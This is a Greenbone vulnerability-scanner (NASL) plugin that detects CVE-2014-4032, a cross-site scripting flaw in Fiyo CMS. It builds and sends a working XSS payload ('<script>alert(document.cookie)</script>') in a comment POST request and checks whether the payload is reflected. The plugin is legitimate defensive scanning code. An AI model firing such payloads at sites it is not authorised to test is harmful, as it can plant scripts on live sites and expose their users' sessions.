# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804651");
  script_version("2023-12-13T05:05:23+0000");
  script_cve_id("CVE-2014-4032");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2014-06-23 12:46:23 +0530 (Mon, 23 Jun 2014)");
  script_name("Fiyo CMS 'Name' POST Parameter Cross-Site Scripting Vulnerability");

  script_tag(name:"summary", value:"Fiyo CMS is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request and check whether it is able to read
  cookie or not.");

  script_tag(name:"insight", value:"Input passed via the HTTP POST parameter 'name' to 'apps/app_comment/index.php'
  script is not properly sanitised before returning to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Fiyo CMS version 1.5.7, Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_xref(name:"URL", value:"http://secunia.com/advisories/58833");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/67729");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/126856");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

http_port = http_get_port(default:80);
if(!http_can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/fiyo", "/fiyocms", "/cms", http_cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/login.php"),  port:http_port);

  if (">Fiyo CMS<" >< rcvRes)
  {
    url = dir + "/about#comments" ;

    postData = 'name="><script>alert(document.cookie)</script>' +
               '&email=test@test.com&web=&com=test&secure=1&send-comment=Send';

    host = http_host_name(port:http_port);
    sndReq = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postData), "\r\n",
                "\r\n", postData, "\r\n");
    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:FALSE);

    if(rcvRes =~ "^HTTP/1\.[01] 200" && '><script>alert(document.cookie)</script>' >< rcvRes
              && '>About Fiyo CMS' >< rcvRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
